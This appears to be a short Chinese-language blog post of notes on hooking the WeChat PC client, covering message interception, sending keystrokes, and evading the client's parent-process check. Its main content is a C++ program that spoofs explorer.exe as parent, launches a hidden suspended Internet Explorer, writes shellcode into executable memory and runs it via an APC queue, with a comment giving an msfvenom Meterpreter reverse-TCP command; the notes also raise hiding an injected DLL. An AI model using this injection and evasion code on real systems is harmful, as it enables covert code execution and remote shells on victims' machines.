---
layout: post
title:  wechat hook
date:   2021-03-20 23:12:36
categories: others
---

仅对于 微信PC 版

#### 消息的接收

1. 似乎可以通过 XML 的相关函数

2. 写入本地数据库时

<!-- more -->

#### 消息的发送

微信窗口使用的是 `msftedit.dll` 中的 [rich-edit-controls] 组件

1. 通过执行 激活 hwnd, 然后发送 Ctrl+v , Enter 事件似乎不太好?
  比如如果你在做其它的事情了? 会被 激活 hwnd 给中断掉,
  也许不需要激活 hwnd , 直接传递 MSG 就可以了

<https://github.com/ttttupup/wxhelper/wiki>

### Tools

- ProcessExplorer 用于查看进程信息

### misc

- 微信似乎会检测其父进程是否为 explorer, 但应该能通过 [PPID Spoofing] 绕过

- 如何隐藏注入的 DLL?

  1. DLL加载顺序劫持?
  2. 用户安全级别参考: <https://github.com/streed/HideMyAss>(未测试)


### codes

[PPID Spoofing](https://pentestlab.blog/2020/02/24/parent-pid-spoofing/)
[rich-edit-controls](https://docs.microsoft.com/en-us/windows/win32/controls/about-rich-edit-controls)

<https://github.com/hlldz/APC-PPID>

```c++
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

DWORD getParentProcessID() {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);

	if (Process32First(snapshot, &process)) {
		do {
            		//If you want to another process as parent change here
			if (!wcscmp(process.szExeFile, L"explorer.exe"))
				break;
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);
	return process.th32ProcessID;
}

int main() {

	//Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c
	unsigned char shellCode[] = "";

	STARTUPINFOEXA sInfoEX;
	PROCESS_INFORMATION pInfo;
	SIZE_T sizeT;

	HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID());

	ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));
	InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
	sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
	InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);
	UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
	sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&sInfoEX), &pInfo);

	LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	SIZE_T *lpNumberOfBytesWritten = 0;
	BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten);

	QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);
	ResumeThread(pInfo.hThread);
	CloseHandle(pInfo.hThread);

	return 0;
}

```